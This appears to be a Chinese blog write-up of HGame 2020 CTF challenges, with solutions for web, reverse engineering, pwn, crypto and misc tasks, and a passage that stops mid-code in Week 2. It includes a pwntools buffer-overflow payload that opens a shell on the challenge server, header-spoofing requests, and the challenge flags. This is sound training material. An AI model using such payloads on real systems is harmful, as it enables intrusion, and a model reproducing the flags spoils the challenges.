确实对我这样的萌新很友好.jpg

~~起码卒于Week2~~

## Week1

### Web

#### 接 头 霸 王

打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：

```http
Referer:https://vidar.club
```

然后提示需要从本地访问，添加响应头：

```http
X-Forwarded-For: 127.0.0.1
```

接着提示flag会在2077年更新，所以添加响应头：

```http
If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT
```

再发送请求得到flag

```flag
hgame{W0w!Your_heads_@re_s0_many!}
```



### RE

#### maze

一看题目又是一道迷宫题，拖进IDA反编译

```c++
v5 = (char *)&unk_6020C4;
  while ( (signed int)v4 < SHIDWORD(v4) )
  {
    v3 = s[(signed int)v4];
    if ( v3 == 100 )
    {
      v5 += 4;
    }
    else if ( v3 > 100 )
    {
      if ( v3 == 115 )
      {
        v5 += 64;
      }
      else
      {
        if ( v3 != 119 )
        {
LABEL_12:
          puts("Illegal input!");
          exit(0);
        }
        v5 -= 64;
      }
    }
    else
    {
      if ( v3 != 97 )
        goto LABEL_12;
      v5 -= 4;
    }
    if ( v5 < (char *)&unk_602080 || v5 > (char *)&unk_60247C || *(_DWORD *)v5 & 1 )
      goto LABEL_22;
    LODWORD(v4) = v4 + 1;
  }
  if ( v5 == (char *)&unk_60243C )
  {
    sprintf(&v7, "hgame{%s}", s, v4);
    puts("You win!");
    printf("Flag is: ");
    puts(&v7);
    exit(0);
  }
LABEL_22:
  puts("You died");
  exit(0);
```

贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是'w','s','a','d'，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点

![maze](https://s2.ax1x.com/2020/02/13/1qp5rT.png)

即从（2，2）位置走到（15，16）位置

所以最后的flag为

```flag
hgame{ssssddddddsssssddwwdddssssdssdd}
```

#### bitwise_operation2

这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。

首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析

```c++
//只贴出了有用的部分并且稍做了排版
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char v6; // [rsp+10h] [rbp-60h]
  char v7; // [rsp+11h] [rbp-5Fh]
  char v8; // [rsp+12h] [rbp-5Eh]
  char v9; // [rsp+13h] [rbp-5Dh]
  char v10; // [rsp+14h] [rbp-5Ch]
  char v11; // [rsp+15h] [rbp-5Bh]
  char v12; // [rsp+16h] [rbp-5Ah]
  char v13; // [rsp+17h] [rbp-59h]
  __int64 v14; // [rsp+20h] [rbp-50h]
  char v15; // [rsp+28h] [rbp-48h]
  __int64 v16; // [rsp+30h] [rbp-40h]
  char v17; // [rsp+38h] [rbp-38h]
  char s; // [rsp+40h] [rbp-30h]		//地址是连续的，flag中间的具体内容是v24和v25起始的两个16
  char v19; // [rsp+41h] [rbp-2Fh]		//字节
  char v20; // [rsp+42h] [rbp-2Eh]
  char v21; // [rsp+43h] [rbp-2Dh]
  char v22; // [rsp+44h] [rbp-2Ch]
  char v23; // [rsp+45h] [rbp-2Bh]
  __int16 v24; // [rsp+46h] [rbp-2Ah]
  __int16 v25; // [rsp+56h] [rbp-1Ah]
  char v26; // [rsp+66h] [rbp-Ah]
  sub_4007E6();//只负责输出，没什么功能
  v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204;
  __isoc99_scanf("%39s", &s);
  if ( strlen(&s) == 39 && s == 'h' && v19 == 'g' && v20 == 'a' && v21 == 'm' && v22 == 'e' && v23 == '{' && v26 == '}' )// 共39位，hgame{***}格式
  {
    v14 = 0LL;
    v15 = 0;
    v16 = 0LL;
    v17 = 0;
    //这两条命令进行第一部分运算
    sub_400616((__int64)&v14, (__int64)&v24);   // 传入地址，对flag中的部分进行操作
    sub_400616((__int64)&v16, (__int64)&v25);
     
    //这里开始进行第二部分运算
    for ( i = 0; i <= 7; ++i )
    {
      *((_BYTE *)&v14 + i) = ((*((_BYTE *)&v14 + i) & 0xE0) >> 5) | 8 * *((_BYTE *)&v14 + i);// &v14 + i前三位与后五位交换位置
      *((_BYTE *)&v14 + i) = *((_BYTE *)&v14 + i) & 0x55 ^ ((*((_BYTE *)&v16 + 7 - i) & 0xAA) >> 1) | *((_BYTE *)&v14 + i) & 0xAA;// &v14+i的奇数位不变，偶数位和&v16+7-i的奇数位异或
      *((_BYTE *)&v16 + 7 - i) = 2 * (*((_BYTE *)&v14 + i) & 0x55) ^ *((_BYTE *)&v16 + 7 - i) & 0xAA | *((_BYTE *)&v16 + 7 - i) & 0x55;// &v16+7-i的偶数位不变，奇数位和&v14+i的偶数位异或
      *((_BYTE *)&v14 + i) = *((_BYTE *)&v14 + i) & 0x55 ^ ((*((_BYTE *)&v16 + 7 - i) & 0xAA) >> 1) | *((_BYTE *)&v14 + i) & 0xAA;// &v14+i奇数位不变，偶数位和&v16+7-i的奇数位异或
    }                                           
    
    //这里进行第三部分运算
    for ( j = 0; j <= 7; ++j )
    {
      *((_BYTE *)&v14 + j) ^= *(&v6 + j);       // v6 = 76;
                                                //   v7 = 60;
                                                //   v8 = 214;
                                                //   v9 = 54;
                                                //   v10 = 80;
                                                //   v11 = 136;
                                                //   v12 = 32;
                                                //   v13 = 204;
      if ( *((_BYTE *)&v14 + j) != byte_602050[j] )// e4sy_Re_
      {
        puts("sry, wrong flag");
        exit(0);
      }
    }
    for ( k = 0; k <= 7; ++k )
    {
      *((_BYTE *)&v16 + k) ^= *((_BYTE *)&v14 + k) ^ *(&v6 + k);	// v6 = 76;
                            	//这里异或之后又变成了V14最初始的值   	  //   v7 = 60;
                                                					//   v8 = 214;
                                                					//   v9 = 54;
                                                					//   v10 = 80;
                                                					//   v11 = 136;
                                                					//   v12 = 32;
                                                					//   v13 = 204;
      if ( *((_BYTE *)&v16 + k) != byte_602060[k] )// Easylif3
      {
        puts("Just one last step");
        exit(0);
      }
    }
    puts("Congratulations! You are already familiar with bitwise operation.");
    puts("Flag is your input.");
    exit(0);
  }
  puts("Illegal input!");
  exit(0);
}

//sub_400616() 第一部分运算所用到的函数
_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2)
{
  _BYTE *result; // rax
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 7; ++i )
  {
    if ( *(_BYTE *)(2 * i + a2) <= 96 || *(_BYTE *)(2 * i + a2) > 102 )
    {
      if ( *(_BYTE *)(2 * i + a2) <= 47 || *(_BYTE *)(2 * i + a2) > 57 )
      {
LABEL_17:
        puts("Illegal input!");
        exit(0);
      }
      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48;
    }
    else
    {
      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87;
    }
    if ( *(_BYTE *)(2 * i + 1LL + a2) <= 96 || *(_BYTE *)(2 * i + 1LL + a2) > 102 )
    {
      if ( *(_BYTE *)(2 * i + 1LL + a2) <= 47 || *(_BYTE *)(2 * i + 1LL + a2) > 57 )
        goto LABEL_17;
      result = (_BYTE *)(i + a1);
      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48;
    }
    else
    {
      result = (_BYTE *)(i + a1);
      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87;
    }
  }
  return result;
}
//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理
```

把整个过程理解清楚之后可以开始写脚本进行一个逆运算了

```python
#-*- coding:utf-8 -*-
# 第三部分逆运算
v = [76, 60, 214, 54, 80, 136, 32, 204]
v0 = 'e4sy_Re_'
v14 = []
for i in range(len(v0)):
    v14.append(ord(v0[i]) ^ v[i])
# print(v14)

v16 = []
v1 = 'Easylif3'
for i in range(len(v1)):
    v16.append(ord(v1[i]) ^ v14[i])  # v14经过两次和v的异或又变回了原本的值
# print(v16)

# 第二部分逆运算
for i in range(8):
    # print(bin(v14[i])[2:].rjust(8,'0'))
    v14[i] = (((v14[i] & 0x55) ^ ((v16[7 - i] & 0xAA) >> 1) % 256) | v14[i] & 0xAA) % 256
    # print(bin(v14[i])[2:].rjust(8,'0'))
    # print(bin(v16[7-i])[2:].rjust(8, '0'))
    v16[7 - i] = (2 * (v14[i] & 0x55) ^ v16[7 - i] & 0xAA | v16[7 - i] & 0x55) % 256
    # print(bin(v16[7-i])[2:].rjust(8, '0'))
    # print(bin(v14[i])[2:].rjust(8, '0'))
    v14[i] = (((v14[i] & 0x55) ^ ((v16[7 - i] & 0xAA) >> 1) % 256) | v14[i] & 0xAA) % 256
    # print(bin(v14[i])[2:].rjust(8, '0'))
    # print(bin(v14[i])[2:].rjust(8,'0'))
    v14[i] = (((v14[i] & 0x1F) << 5) | ((v14[i] & 0xF8) >> 3)) % 256
    # print(bin(v14[i])[2:].rjust(8,'0'))

# print(v14)
# print(v16)

# 第一部分逆运算
v24 = [0 for i in range(16)]
v25 = [0 for i in range(16)]
alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]
# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算
for i in range(8):
    for j in alphabet:
        if 57 >= j > 47:
            tmp = j - 48
        else:
            tmp = j - 87
        v24[2*i]=j
        if 57 >= v14[i] - 16 * tmp + 48 > 47:
            v24[2 * i + 1] = v14[i] - 16 * tmp + 48
            break
        elif 102 >= v14[i] - 16 * tmp + 87 > 96:
            v24[2 * i + 1] = v14[i] - 16 * tmp + 87
            break
        else:
            continue

for i in range(8):
    for j in alphabet:
        v25[2 * i] = j
        if 57 >= j > 47:
            tmp = j - 48
        else:
            tmp = j - 87
        if 102 >= v16[i] - 16 * tmp + 87 > 96:
            v25[2 * i + 1] = v16[i] - 16 * tmp + 87
            break
        elif 57 >= v16[i] - 16 * tmp + 48 > 47:
            v25[2 * i + 1] = v16[i] - 16 * tmp + 48
            break
        else:
            continue

# print(v24)
# print(v25)
flag = 'hgame{'+''.join([chr(v24[i]) for i in range(16)]) + ''.join([chr(v25[i]) for i in range(16)])+'}'
print(flag)
```

输出得到flag

```flag
hgame{0f233e63637982d266cbf41ecb1b0102}
```

到虚拟机上验证一下，发现结果正确

![bitwise_operation2](https://s2.ax1x.com/2020/02/13/1qpqi9.png)

#### advance

windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 len; // rax
  int len0; // edi
  unsigned __int64 v5; // rax
  _BYTE *v6; // rbx
  const char *v7; // rcx
  char flag; // [rsp+20h] [rbp-118h]

  puts("please input you flag:\n");
  memset(&flag, 0, 0x100ui64);
  scanf("%s", &flag, 100i64);
  len = strlen(&flag);                          // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）
  len0 = len;
  if ( !len )                                   // 若输入空字符串，直接报错
  {
LABEL_6:
    v7 = "try again\n";
    goto LABEL_7;
  }
  v5 = sub_140002000(len);                      
  v6 = malloc(v5);								// 分配空间
  cryption(v6, (__int64)&flag, len0);           // 加密算法部分
  if ( strncmp(v6, "0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX", 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确
  {
    if ( v6 )
      free(v6);
    goto LABEL_6;
  }
  v7 = "get it\n";
LABEL_7:
  puts(v7);
  return 0;
}
//最重要的cryption加密函数
signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3)
{
  int v3; // er10
  __int64 v4; // rax
  __int64 v5; // rbx
  _BYTE *v6; // rdi
  _BYTE *v7; // r9
  signed __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rax
  char v11; // cl
  // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度
  v3 = 0;
  v4 = a3 - 2;
  v5 = a2;
  v6 = a1;
  v7 = a1;
  if ( v4 > 0 )
  {
    v8 = a2 + 1;
    v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 >> 64) >> 1) + 1;
    v3 = 3 * v9;
    do
    {
      v10 = *(unsigned __int8 *)(v8 - 1);
      v8 += 3i64;
      *v7 = alphabet[v10 >> 2];
      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) >> 4) | 16i64 * (*(_BYTE *)(v8 - 4) & 3)];
      v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) & 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) >> 6)];
      v7[3] = alphabet[*(_BYTE *)(v8 - 2) & 0x3F];
      v7 += 4;
      --v9;
    }
    while ( v9 );
  }
  if ( v3 < a3 )
  {
    *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) >> 2];
    if ( v3 == a3 - 1 )
    {
      v11 = 61;
      v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) & 3)];
    }
    else
    {
      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) >> 4) | 16i64 * (*(_BYTE *)(v3 + v5) & 3)];
      v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) & 0xF)];
    }
    v7[2] = v11;
    v7[3] = 61;
    v7 += 4;
  }
  *v7 = 0;
  return v7 - v6 + 1;
}
```

可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组

```python
alphabet='abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'
```

观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。

```python
#-*- coding:utf-8 -*-

def b64de(path_in, path_out):
    b64_str = open(path_in).read()
    charset = "abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    # print(charset)
    bin_str = []
    for i in b64_str:
        if i != '=':
            try:
                x = str(bin(charset.index(i))).replace('0b', '')
            except ValueError:
                print(i)
            bin_str.append('{:0>6}'.format(x))  # 填充成6位
            # print(bin_str)
    b64_bin = bytearray()  # 最后只能写入bytes
    nums = len(bin_str) // 4
    remain = len(bin_str) % 4
    fore_part = bin_str[:4 * nums]  # 四个一组截取
    # print(fore_part)
    while fore_part:
        # 取4个6位base64字符，作为3个字节
        b64_tmp = ''.join(fore_part[:4])  # 4*6/8

        b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]]  # 转换成10进制
        # print(b64_tmp)
        for i in b64_tmp:
            b64_bin.append(i)
        fore_part = fore_part[4:]  # 向后移动四位

    if remain:
        remain_part = ''.join(bin_str[nums * 4:])
        # print(remain_part)
        tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]
        # print(tmp)
        for i in tmp:
            b64_bin.append(i)
    # print(b64_bin)
    fd = open(path_out, 'wb')
    fd.write(b64_bin)
    fd.close()
    
if __name__ == '__main__':
    b64de("./pic_en.txt", "./pic_de.txt")
    
```

输出的flag为：

```flag
hgame{b45e6a_i5_50_eazy_6VVSQ}
```

#### cpp

这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜

```c++
 sub_140002AE0((__int64)&v13);                 // 大概是string类的构造函数
  sub_1400018D0(std::cin, &v13);                // cin>>v13
  v15 = "hgame{";
  sub_140002B30((__int64)&v14);
  if ( find_sub(&v13, v15, 0i64) || find_sub(&v13, "}", 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame{***}
  {
    v5 = sub_140001900(std::cout, "error");
    std::basic_ostream<char,std::char_traits<char>>::operator<<(v5, sub_140002830);
    sub_140003010(&v14);
    sub_140002FA0(&v13);
    result = 0i64;
  }
  else
  {
    for ( i = 6i64; ; i = v11 + 1 )             // 一波操作完全看不懂，猜测是根据'_'来分割字符串，分割成9个数
    {
      LOBYTE(v0) = '_';
      v11 = find(&v13, v0, i);
      if ( v11 == -1 )
        break;
      v16 = sub_1400043B0(&v13, &v40, i, v11 - i);
      v17 = v16;
      v1 = sub_140003E80(v16);
      v18 = atoll(v1);
      sub_140004350(&v14, &v18);
      sub_140002FA0(&v40);
    }
    v19 = sub_1400043B0(&v13, &v41, i, 61 - i);
    v20 = v19;
    v2 = sub_140003E80(v19);
    v21 = atoll(v2);                            // 直接把字符串转换成长整型，说明字符串里就是以'_'连接的数字
    sub_140004350(&v14, &v21);
    sub_140002FA0(&v41);
    v31 = 26727i64;                             // 根据下面的运算这里应该是两个矩阵
    v32 = 24941i64;
    v33 = 101i64;
    v34 = 29285i64;
    v35 = 26995i64;
    v36 = 29551i64;
    v37 = 29551i64;
    v38 = 25953i64;
    v39 = 29561i64;
    v22 = 1i64;
    v23 = 0i64;
    v24 = 1i64;
    v25 = 0i64;
    v26 = 1i64;
    v27 = 1i64;
    v28 = 1i64;
    v29 = 2i64;
    v30 = 2i64;
    for ( j = 0i64; j < 3; ++j )                // 三个for循环时矩阵运算，如果满足条件就直接输出正确
    {
      for ( k = 0i64; k < 3; ++k )
      {
        v12 = 0i64;
        for ( l = 0; l < 3; ++l )
          v12 += *(&v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&v14, l + 3 * j);
        if ( *(&v31 + 3 * j + k) != v12 )
        {
          v3 = sub_140001900(std::cout, "error");
          std::basic_ostream<char,std::char_traits<char>>::operator<<(v3, sub_140002830);
          sub_140003010(&v14);
          sub_140002FA0(&v13);
          return 0i64;
        }
      }
    }
    v6 = sub_140001900(std::cout, "you are good at re");
    std::basic_ostream<char,std::char_traits<char>>::operator<<(v6, sub_140002830);
```

最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag

尝试一下

```python
import numpy as np

a = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])
b = np.linalg.inv(a)
# print(b)
# print(np.dot(a,b))
c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])
flag = ''
d = np.dot(c, b)
for i in range(3):
    for j in range(3):
        flag += str(int(d.item(i, j))) + '_'
flag = 'hgame{' + flag[:-1] + '}'
print(flag)
```

提交提示成功，猜测正确

```flag
hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}
```



### PWN

#### Hard_AAAAA

IDA反编译

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-ACh]
  char v5; // [esp+7Bh] [ebp-31h]
  unsigned int v6; // [esp+A0h] [ebp-Ch]
  int *v7; // [esp+A4h] [ebp-8h]

  v7 = &argc;
  v6 = __readgsdword(0x14u);
  alarm(8u);
  setbuf(_bss_start, 0);
  memset(&s, 0, 0xA0u);
  puts("Let's 0O0o\\0O0!");
  gets(&s);
  if ( !memcmp("0O0o", &v5, 7u) )
    backdoor();
  return 0;
}
//backdoor
int backdoor()
{
  return system("/bin/sh");
}
```

所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload

```python
from pwn import *
io = remote("47.103.214.163","20000")
#io=process("./Hard_AAAAA")
io.recvuntil("Let's 0O0o\\0O0!")
payload='a'*123+'0O0o\0O0'
io.sendline(payload)
io.interactive()
```

最终得到flag：

```flag
hgame{0OoO0oo0O0Oo}
```



### Crypto

#### InfantRSA

简单的RSA解密，p和q都已经分解出来了，其它的没什么难度

```python
#-*- coding:utf-8 -*-
def gcdext(a, b):
    """
    a: 模的取值
    b: 想求逆的值
    """
    if b == 0:
        return 1, 0, a
    x, y, gcd = gcdext(b, a % b)
    return y, x - a // b * y, gcd


c = 275698465082361070145173688411496311542172902608559859019841
p = 681782737450022065655472455411
q = 675274897132088253519831953441
e = 13
n = p * q
# print(k)
fai = (p - 1) * (q - 1)
(d, k, g) = gcdext(e, fai)
# print(fai)
# print(k)
# print(m)
m = pow(c, d, n)
# print(m)
f = m.to_bytes(22, byteorder='big')
print(f)

```

直接求解出来flag

```flag
hgame{t3Xt6O0k_R5A!!!}
```



### misc

#### 欢迎参加HGame！

首先看到一长串似曾相识的东西

```
Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t
```

像是摩斯电码base64加密之后的东西

所以base64解码之后

```morse
.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--
```

果然是摩斯电码，然后解摩斯电码

```python
#-*- coding:utf-8 -*-
CODE = {'A': '.-', 'B': '-...', 'C': '-.-.',
        'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..',
        'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---',
        'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-',
        'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..',

        '0': '-----', '1': '.----', '2': '..---',
        '3': '...--', '4': '....-', '5': '.....',
        '6': '-....', '7': '--...', '8': '---..',
        '9': '----.',

        '.': '.-.-.-', ':': '---...', ',': '--..--', ';': '-.-.-.',
        '?': '..--..', '=': '-...-', '\'': '.----.', '/': '-..-.',
        '!': '-.-.--', '-': '-....-', '_': '..--.-', '"': '.-..-.',
        '(': '-.--.', ')': '-.--.-', '$': '...-..-', '&': '.-...',
        '@': '.--.-.'

        }


def Decode(str):
    Decode_value = CODE.keys()
    Decode_key = CODE.values()
    Decode_dict = dict(zip(Decode_key, Decode_value))

    text = ''
    msg = str.split(' ')
    for s in msg:
        if s in Decode_dict.keys():
            text += Decode_dict[s]
    return text


print(Decode('.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--'))

```

这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：

```flag
hgame{W3LC0ME_TO_2020_HGAM3}
```

#### 壁纸

下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815

解压出来打开flag.txt，内容如下：

```
\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d
```

unicode编码，解码得：

```flag
hgame{Do_y0u_KnOW_uNiC0d3?}
```

#### 签到题ProPlus

压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：

```
Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.

JRFVJYFZVRUAGMAI


* Three fences first, Five Caesar next. English sentense first,  zip password next.
```

根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码

```
Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.

EAVMUBAQHQMVEPDT
```

解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag

```flag
hgame{3Nc0dInG_@lL_iN_0Ne!}
```

这题有各种各样的编码，还不错

## Week2

### RE

#### unpack

明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳
由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）
脱壳的过程借鉴https://www.52pojie.cn/thread-1048649-1-1.html
很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出

```c++
#include <idc.idc>
#define PT_LOAD              1

#define PT_DYNAMIC           2

static main(void)
{
  auto ImageBase,StartImg,EndImg;
  auto e_phoff;
  auto e_phnum,p_offset;
  auto i,dumpfile;
  ImageBase=0x400000;
  StartImg=0x400000;
  EndImg=0x0;
  if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )
  {
    if(dumpfile=fopen("D:\\dumpfile","wb"))
    {
      e_phoff=ImageBase+Qword(ImageBase+0x20);
      Message("e_phoff = 0x%x\n", e_phoff);
      e_phnum=Word(ImageBase+0x38);
      Message("e_phnum = 0x%x\n", e_phnum);
      for(i=0;i<e_phnum;i++)
      {
         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)
         { 
			p_offset=Qword(e_phoff+0x8);
            StartImg=Qword(e_phoff+0x10);
            EndImg=StartImg+Qword(e_phoff+0x28);
            Message("start = 0x%x, end = 0x%x, offset = 0x%x\n", StartImg, EndImg, p_offset);
            dump(dumpfile,StartImg,EndImg,p_offset);
            Message("dump segment %d ok.\n",i);
         }    
         e_phoff=e_phoff+0x38;
      }

      fseek(dumpfile,0x3c,0);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);

      fseek(dumpfile,0x28,0);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
	  
      fclose(dumpfile);
    }else Message("dump err.");
  }

}
static dump(dumpfile,startimg,endimg,offset) 
{
  auto i;
  auto size;
  size=endimg-startimg;
  fseek(dumpfile,offset,0);
  for ( i=0; i < size; i=i+1 ) 
  {
	fputc(Byte(startimg+i),dumpfile);
  }
}
```

尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分

```c++
scanf((__int64)"%42s", v7);
  v5 = 0;
  for ( i = 0; i <= 41; ++i )
  {
    if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] )
      v5 = 1;
  }
  if ( v5 == 1 )
  {
    v0 = "Wrong input";
    printf("Wrong input", v7);
  }
  else
  {
    v0 = "Congratulations! Flag is your input";
    printf("Congratulations! Flag is your input", v7);
  }
```

本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag

```c++
#include <iostream>
#include <string>
using namespace std;
int main() {
    unsigned char ida_chars[] =
            {
                    0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49,
                    0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65,
                    0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D,
                    0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95,
                    0x8F, 0xA6
            };
    string flag;

    for(int i=0;i<42;i++)
        {
            flag+=ida_chars[i]-i;
        }
    cout<<flag<<endl;
    return 0;
}
```

最后输出flag

```
hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng}
```

#### Classic_CrackMe

PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，

dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里

```c#
private void button1_Click(object sender, EventArgs e)
		{
			if (this.status == 1)
			{
				MessageBox.Show("你已经激活成功啦，快去提交flag吧~~~");
				return;
			}
			string text = this.textBox1.Text;
			if (text.Length != 46 || text.IndexOf("hgame{") != 0 || text.IndexOf("}") != 45)
			{
				MessageBox.Show("Illegal format");
				return;
			}
			string base64iv = text.Substring(6, 24);
			string str = text.Substring(30, 15);
			try
			{
				Aes aes = new Aes("SGc0bTNfMm8yMF9XZWVLMg==", base64iv);
				Aes aes2 = new Aes("SGc0bTNfMm8yMF9XZWVLMg==", "MFB1T2g5SWxYMDU0SWN0cw==");
				string text2 = aes.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=");
				if (text2.Equals("Same_ciphertext_"))
				{
					byte[] array = new byte[16];
					Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);
					if (Convert.ToBase64String(array).Equals("dJntSWSPWbWocAq4yjBP5Q=="))
					{
						MessageBox.Show("注册成功！");
						this.Text = "已激活，欢迎使用！";
						this.status = 1;
					}
					else
					{
						MessageBox.Show("注册失败！\nhint: " + aes2.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="));
					}
				}
				else
				{
